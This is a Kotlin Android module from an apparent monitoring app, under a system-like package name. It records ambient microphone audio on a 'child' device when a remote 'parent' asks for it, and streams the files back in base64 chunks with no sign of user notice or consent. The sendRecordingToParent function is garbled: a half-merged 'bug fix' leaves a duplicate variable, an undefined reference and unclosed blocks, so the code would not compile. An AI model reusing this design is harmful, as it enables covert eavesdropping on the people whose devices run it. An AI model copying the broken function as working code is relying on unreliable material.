package com.system.service.monitors

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import com.system.service.core.CoreService
import org.json.JSONObject
import java.io.File

/**
 * Records ambient audio to a local file (not streamed).
 * Parent requests recording, child saves file, parent downloads it.
 */
object AmbientRecorder {

    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null
    @Volatile private var isRecording = false

    fun isRecording() = isRecording

    fun startRecording(context: Context, durationSeconds: Int = 60) {
        if (isRecording) {
            stopRecording(context)
            // BUG #4 FIX: Don't return — fall through to start new recording after stopping
        }
        try {
            val dir = context.getExternalFilesDir("recordings") ?: context.filesDir
            dir.mkdirs()
            val ts = System.currentTimeMillis()
            outputFile = File(dir, "ambient_$ts.m4a")

            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(96000)
                setOutputFile(outputFile!!.absolutePath)
                setMaxDuration(durationSeconds * 1000)
                setOnInfoListener { _, what, _ ->
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        stopRecording(context)
                    }
                }
                prepare()
                start()
            }
            isRecording = true

            CoreService.instance?.sendData("recording_started", JSONObject().apply {
                put("type",             "ambient_audio")
                put("duration_seconds", durationSeconds)
                put("filename",         outputFile!!.name)
            })
        } catch (e: Exception) {
            isRecording = false
            recorder?.release()
            recorder = null
            CoreService.instance?.sendData("recording_error", JSONObject().apply {
                put("type",  "ambient_audio")
                put("error", e.message ?: "unknown")
            })
        }
    }

    fun stopRecording(context: Context) {
        if (!isRecording) return
        try {
            recorder?.stop()
        } catch (_: Exception) {}
        recorder?.release()
        recorder = null
        isRecording = false

        val file = outputFile ?: return
        if (file.exists() && file.length() > 1024) {
            // Send metadata; parent can request the actual file bytes next
            CoreService.instance?.sendData("recording_ready", JSONObject().apply {
                put("type",     "ambient_audio")
                put("path",     file.absolutePath)
                put("filename", file.name)
                put("size_kb",  file.length() / 1024)
                put("time",     System.currentTimeMillis())
            })
        }
    }

    /** Send the recording file as base64 chunks to parent */
    fun sendRecordingToParent(context: Context, path: String) {
        val file = File(path)
        if (!file.exists()) return
        Thread {
            try {
                // BUG #5 FIX: Stream in chunks instead of readBytes() — prevents OOM on large files
                val chunkBytes  = 48 * 1024
                val fileSize    = file.length()
                val totalChunks = ((fileSize + chunkBytes - 1) / chunkBytes).toInt()
                var chunkIndex  = 0
                file.inputStream().buffered(chunkBytes).use { stream ->
                    val buf = ByteArray(chunkBytes)
                    var read: Int
                    while (stream.read(buf).also { read = it } != -1) {
                        val b64 = android.util.Base64.encodeToString(buf.copyOf(read), android.util.Base64.NO_WRAP)
                val b64    = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                // Split into 64KB chunks to stay under WebSocket frame limits
                val chunkSize = 64 * 1024
                val totalChunks = (b64.length + chunkSize - 1) / chunkSize
                for (i in 0 until totalChunks) {
                    val start = i * chunkSize
                    val end   = minOf(start + chunkSize, b64.length)
                    CoreService.instance?.sendData("recording_chunk", JSONObject().apply {
                        put("filename",     file.name)
                        put("chunk",        i)
                        put("total_chunks", totalChunks)
                        put("data",         b64.substring(start, end))
                        put("size_kb",      file.length() / 1024)
                    })
                    Thread.sleep(50) // avoid flooding WebSocket
                }
            } catch (e: Exception) {
                CoreService.instance?.sendData("recording_error", JSONObject().apply {
                    put("type", "send_failed"); put("error", e.message ?: "")
                })
            }
        }.start()
    }

    fun listRecordings(context: Context): List<File> {
        val dir = context.getExternalFilesDir("recordings") ?: context.filesDir
        return dir.listFiles()?.filter { it.extension == "m4a" }
            ?.sortedByDescending { it.lastModified() } ?: emptyList()
    }
}
